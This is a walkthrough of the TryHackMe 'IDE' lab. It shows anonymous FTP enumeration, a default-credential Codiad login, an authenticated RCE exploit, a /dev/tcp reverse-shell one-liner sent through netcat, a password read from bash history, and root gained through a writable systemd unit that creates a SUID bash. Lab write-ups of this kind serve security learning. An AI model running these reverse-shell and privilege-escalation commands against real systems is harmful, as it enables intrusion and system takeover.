# IDE

Room: https://tryhackme.com/room/ide

An easy box to polish your enumeration skills!

⚠️ STOP

Stuck and need a nudge in the right direction?

➡️ Try the hints page before reading the full solution: https://github.com/garthheff/CTF-Hints/blob/main/Anonforce.md

---

# TryHackMe IDE Walkthrough

## Overview

This room involved enumerating an exposed FTP service, finding credentials for Codiad, using an authenticated Codiad 2.8.4 exploit to gain a shell, then escalating privileges through a writable `vsftpd` systemd service file.

The main path was:

```text
Anonymous FTP
Hidden FTP directory
Codiad credentials
Authenticated Codiad RCE
www-data shell
drac password in bash history
Writable vsftpd systemd service
SUID bash as root
```

## Nmap Scan

I started with a full TCP scan and service detection:

```bash
sudo nmap -sV -sC -p- --min-rate 5000 -oN nmap-sv-all.txt 10.66.169.19
```

The important results were:

```text
21/tcp    open  ftp     vsftpd 3.0.3
22/tcp    open  ssh     OpenSSH 7.6p1 Ubuntu
80/tcp    open  http    Apache httpd 2.4.29
62337/tcp open  http    Apache httpd 2.4.29
```

Nmap also showed anonymous FTP was allowed:

```text
Anonymous FTP login allowed
```

Port `62337` was especially interesting because the HTTP title showed:

```text
Codiad 2.8.4
```

## FTP Enumeration

I connected to FTP anonymously:

```bash
ftp 10.66.169.19
```

Login:

```text
anonymous
```

The first listing looked mostly empty, but `ls -la` showed a hidden-looking directory named `...`:

```text
drwxr-xr-x    2 0        0            4096 Jun 18  2021 ...
```

I changed into that directory:

```text
cd ...
ls -la
```

Inside was a file with the awkward filename `-`:

```text
-rw-r--r--    1 0        0             151 Jun 18  2021 -
```

Because the filename was just a dash, I downloaded it as a normal local filename:

```text
get ./- dash.txt
```

Then I read it locally:

```bash
cat dash.txt
```

The note said:

```text
Hey john,
I have reset the password as you have asked. Please use the default password to login.
Also, please take care of the image file ;)
- drac.
```

This gave two useful clues:

```text
Username: john
Password hint: default password
```

## Codiad Login

The Codiad login page was available at:

```text
http://10.66.169.19:62337
```

Using the FTP note, I tested the default password:

```bash
curl -i -s -X POST "http://10.66.169.19:62337/components/user/controller.php?action=authenticate" \
  -d "username=john&password=password&theme=default&language=en"
```

The response confirmed the login worked:

```json
{"status":"success","data":{"username":"john"}}
```

So the Codiad credentials were:

```text
john:password
```

## Codiad 2.8.4 Authenticated RCE

Since the application was Codiad 2.8.4 and I had valid credentials, I searched for an exploit:

```bash
searchsploit codiad 2.8.4
```

I copied the exploit locally:

```bash
searchsploit -m php/webapps/49705.py
```

The exploit needed a trailing slash on the URL. Without it, it built a broken URL like this:

```text
http://10.66.169.19:62337components/filemanager/controller.php
```

The correct format was:

```bash
python3 49705.py http://10.66.169.19:62337/ john password 10.66.95.99 4444 linux
```

The exploit asked for two listeners.

Listener 1 sends the reverse shell payload:

```bash
echo 'bash -c "bash -i >/dev/tcp/10.66.95.99/4445 0>&1 2>&1"' | nc -lnvp 4444
```

Listener 2 catches the real shell:

```bash
nc -lnvp 4445
```

After running the exploit, I received a shell as `www-data`:

```text
www-data@ide:/var/www/html/codiad/components/filemanager$
```

## Shell Stabilisation

I stabilised the shell:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
```

## Finding Drac's Password

The FTP note was signed by `drac`, so I checked `/home/drac`.

Inside `.bash_history`, there was a MySQL command containing a password:

```bash
cat /home/drac/.bash_history
```

The history showed:

```text
mysql -u drac -p 'Th3d...R3aL'
```

I then switched to the `drac` user:

```bash
su drac
```

Password:

```text
Th3d...R3aL
```

This worked.

## User Flag

As `drac`, the user flag was in the home directory:

```bash
cat ~/user.txt
```

Flag:

```text
02930d...24a466
```

## Privilege Escalation Enumeration

I checked sudo permissions:

```bash
sudo -l
```

The output showed:

```text
User drac may run the following commands on ide:
    (ALL : ALL) /usr/sbin/service vsftpd restart
```

This meant `drac` could restart the `vsftpd` service as root.

I then checked the service file:

```bash
systemctl cat vsftpd
ls -la /lib/systemd/system/vsftpd.service
```

The service file was writable by the `drac` group:

```text
-rw-rw-r-- 1 root drac 248 /lib/systemd/system/vsftpd.service
```

This was the privilege escalation path.

## Root via Writable systemd Service

Since `drac` could write to the `vsftpd` systemd unit and restart the service with sudo, I replaced the service with a payload that created a SUID copy of bash.

```bash
printf '%s\n' '[Unit]' 'Description=vsftpd FTP server' 'After=network.target' '' '[Service]' 'Type=oneshot' "ExecStart=/bin/bash -c 'rm -f /tmp/rootbash; cp /bin/bash /tmp/rootbash; chown root:root /tmp/rootbash; chmod 4755 /tmp/rootbash'" 'RemainAfterExit=yes' '' '[Install]' 'WantedBy=multi-user.target' > /lib/systemd/system/vsftpd.service
```

Then I reloaded systemd:

```bash
systemctl daemon-reload
```

This prompted for `drac`'s password and completed successfully.

Then I restarted the service using the allowed sudo command:

```bash
sudo /usr/sbin/service vsftpd restart
```

This created `/tmp/rootbash`:

```bash
ls -la /tmp/rootbash
```

Then I used it to get a root shell:

```bash
/tmp/rootbash -p
```

Confirmed root:

```bash
id
```

## Root Flag

Finally, I read the root flag:

```bash
cat /root/root.txt
```

Flag:

```text
ce258c...e0fb8d
```

## Final Notes

The main lesson from this room was to pay close attention to small filesystem details:

- FTP had a hidden `...` directory.
- The important FTP file was named `-`, which needed to be downloaded as `./-`.
- Codiad RCE required valid credentials.
- The local user password was leaked in `.bash_history`.
- `sudo -l` only allowed restarting `vsftpd`, but the systemd service file itself was writable by the `drac` group.

The final privilege escalation worked because the service file was writable and the user could restart that service as root.


